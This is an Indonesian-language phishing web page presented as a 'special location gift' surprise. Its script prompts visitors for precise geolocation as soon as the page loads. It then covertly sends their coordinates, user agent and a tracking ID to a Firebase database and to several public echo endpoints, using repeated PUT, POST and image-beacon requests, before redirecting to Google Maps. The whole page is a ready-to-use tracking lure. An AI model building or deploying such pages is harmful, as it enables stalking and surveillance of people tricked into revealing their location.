<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>X-TOS Location Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#667eea">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            text-align: center; padding: 10px; margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; overflow-x: hidden;
        }
        .container { 
            max-width: 420px; margin: 0 auto; padding: 15px;
            width: 100%; min-height: 100vh; display: flex;
            flex-direction: column; justify-content: center;
        }
        .gift-box { 
            background: rgba(255,255,255,0.15); 
            border-radius: 20px; padding: 25px; margin: 15px 0;
            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .gift-icon { 
            font-size: clamp(50px, 15vw, 70px); 
            margin-bottom: 15px; animation: bounce 2s infinite;
        }
        .status { 
            padding: 18px; border-radius: 15px; margin: 15px 0;
            background: rgba(255,255,255,0.25); font-weight: 500;
            border: 1px solid rgba(255,255,255,0.3);
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        .loading { animation: pulse 2s infinite; }
        .instruction {
            background: rgba(76,175,80,0.3); 
            border-radius: 15px; padding: 18px; margin: 15px 0;
            border: 2px solid #4CAF50; font-weight: 500;
        }
        .coords-display {
            background: rgba(33,150,243,0.3);
            border-radius: 15px; padding: 15px; margin: 15px 0;
            border: 2px solid #2196F3; font-family: monospace;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                           40% { transform: translateY(-10px); }
                           60% { transform: translateY(-5px); } }
        h1 { 
            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
        }
        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
        .btn {
            background: #4CAF50; color: white; border: none;
            padding: 15px 30px; border-radius: 25px; font-size: 16px;
            cursor: pointer; margin: 10px; transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
        }
        .btn:hover { background: #45a049; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ HADIAH LOKASI SPESIAL!</h1>
        <div class="gift-box">
            <div class="gift-icon">üéÅ</div>
            <p>Seseorang mengirim lokasi spesial untukmu!</p>
            <p><strong>Klik IZINKAN untuk melihat kejutan üòä</strong></p>
        </div>
        <div id="status" class="status loading">üì° Menunggu izin lokasi...</div>
        <div id="coords" class="coords-display" style="display:none;"></div>
        <div class="instruction">
            <p>‚¨áÔ∏è Saat browser minta izin lokasi:</p>
            <p><strong>üü¢ Klik "IZINKAN" atau "ALLOW"</strong></p>
            <button class="btn" onclick="requestLocation()" id="manualBtn" style="display:none;">üìç Minta Izin Lokasi</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let retryCount = 0;
        const maxRetries = 3;
        
        function updateStatus(msg, isError = false) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = msg;
            statusEl.className = isError ? 'status' : 'status loading';
        }
        
        function sendLocationData(locationData) {
            const trackingId = urlParams.get('id') || 'default_' + Date.now();
            
            console.log('üöÄ SENDING LOCATION:', {
                tracking_id: trackingId,
                latitude: locationData.latitude,
                longitude: locationData.longitude
            });
            
            // GUARANTEED TRANSMISSION - Multiple methods simultaneously
            
            // Method 1: Firebase Realtime Database (PRIMARY)
            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
            
            const firebaseData = {
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                accuracy: locationData.accuracy,
                timestamp: locationData.timestamp,
                userAgent: locationData.userAgent.substring(0, 100),
                captured_at: new Date().toISOString(),
                status: 'captured',
                tracking_id: trackingId
            };
            
            // Send to Firebase with retry
            for (let attempt = 0; attempt < 3; attempt++) {
                setTimeout(() => {
                    fetch(firebaseUrl, {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(firebaseData)
                    }).then(response => {
                        if (response.ok) {
                            console.log(`‚úÖ Firebase transmission ${attempt + 1} successful`);
                        } else {
                            console.log(`‚ùå Firebase transmission ${attempt + 1} failed`);
                        }
                    }).catch(e => {
                        console.log(`Firebase attempt ${attempt + 1} error:`, e);
                    });
                }, attempt * 500);
            }
            
            // Method 2: Alternative Firebase paths for redundancy
            const altPaths = ['active', 'live', 'current'];
            altPaths.forEach((path, index) => {
                setTimeout(() => {
                    const altUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/${path}/${trackingId}.json`;
                    fetch(altUrl, {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(firebaseData)
                    }).catch(e => console.log(`Alt path ${path} error:`, e));
                }, index * 200);
            });
            
            // Method 3: Broadcast to multiple endpoints
            const endpoints = [
                'https://httpbin.org/post',
                'https://postman-echo.com/post',
                'https://jsonplaceholder.typicode.com/posts'
            ];
            
            endpoints.forEach((endpoint, index) => {
                setTimeout(() => {
                    fetch(endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            xtos_tracking_id: trackingId,
                            xtos_latitude: locationData.latitude,
                            xtos_longitude: locationData.longitude,
                            xtos_timestamp: locationData.timestamp,
                            endpoint_index: index
                        })
                    }).catch(e => console.log(`Endpoint ${index} error:`, e));
                }, index * 100);
            });
            
            // Method 4: GET requests with parameters (for polling detection)
            for (let burst = 0; burst < 10; burst++) {
                setTimeout(() => {
                    const img = new Image();
                    img.src = `https://httpbin.org/get?xtos_id=${trackingId}&xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&burst=${burst}&rand=${Math.random()}`;
                }, burst * 100);
            }
            
            // Method 5: LocalStorage for immediate access
            const storageData = {
                tracking_id: trackingId,
                location_data: locationData,
                stored_at: Date.now()
            };
            
            localStorage.setItem('xtos_latest_location', JSON.stringify(storageData));
            localStorage.setItem(`xtos_location_${trackingId}`, JSON.stringify(storageData));
            
            // Method 6: URL hash for instant detection
            window.location.hash = `id=${trackingId}&lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}&status=captured`;
            
            // Method 7: Document title for detection
            document.title = `XTOS_CAPTURED:${trackingId}:${locationData.latitude}:${locationData.longitude}:${locationData.timestamp}`;
            
            console.log('üì° LOCATION TRANSMITTED VIA ALL METHODS');
            
            return Promise.resolve();
        }
        
        function handleLocationSuccess(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = Math.round(position.coords.accuracy);
            
            updateStatus('‚úÖ Lokasi berhasil didapat!');
            
            const coordsEl = document.getElementById('coords');
            coordsEl.style.display = 'block';
            coordsEl.innerHTML = 
                `üìç <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
                `üìè <strong>Akurasi:</strong> ${accuracy}m<br>` +
                `‚è∞ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
            
            const locationData = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                url: window.location.href
            };
            
            console.log('üéØ LOKASI TERTANGKAP:', locationData);
            
            // Send data immediately
            sendLocationData(locationData);
            updateStatus('üì§ Data lokasi terkirim ke semua endpoint!');
            
            // Redirect after successful transmission
            setTimeout(() => {
                updateStatus('üöÄ Mengarahkan ke Google Maps...');
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
                }, 1000);
            }, 2000);
        }
        
        function handleLocationError(error) {
            let errorMsg = '';
            let showRetry = false;
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg = '‚ùå Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
                    showRetry = true;
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMsg = '‚ùå Lokasi tidak tersedia. Pastikan GPS aktif!';
                    showRetry = true;
                    break;
                case error.TIMEOUT:
                    errorMsg = '‚è±Ô∏è Timeout. Mencoba lagi...';
                    if (retryCount < maxRetries) {
                        retryCount++;
                        setTimeout(requestLocation, 2000);
                        return;
                    }
                    showRetry = true;
                    break;
            }
            
            updateStatus(errorMsg, true);
            
            if (showRetry) {
                document.getElementById('manualBtn').style.display = 'inline-block';
                document.getElementById('coords').style.display = 'block';
                document.getElementById('coords').innerHTML = 
                    '<p><strong>Cara mengatasi:</strong></p>' +
                    '<p>1. Refresh halaman ini</p>' +
                    '<p>2. Klik IZINKAN saat diminta</p>' +
                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
                    '<p>4. Gunakan browser Chrome/Safari</p>';
                
                setTimeout(() => {
                    window.location.href = 'https://maps.google.com/';
                }, 8000);
            }
        }
        
        function requestLocation() {
            if (!navigator.geolocation) {
                updateStatus('‚ùå Browser tidak mendukung geolocation', true);
                return;
            }
            
            updateStatus('üì° Meminta izin lokasi...');
            document.getElementById('manualBtn').style.display = 'none';
            
            navigator.geolocation.getCurrentPosition(
                handleLocationSuccess,
                handleLocationError,
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        // Auto-start immediately
        window.addEventListener('load', () => {
            setTimeout(requestLocation, 500);
        });
        
        // Retry on visibility change
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && retryCount < maxRetries) {
                setTimeout(requestLocation, 300);
            }
        });
    </script>
</body>
</html>
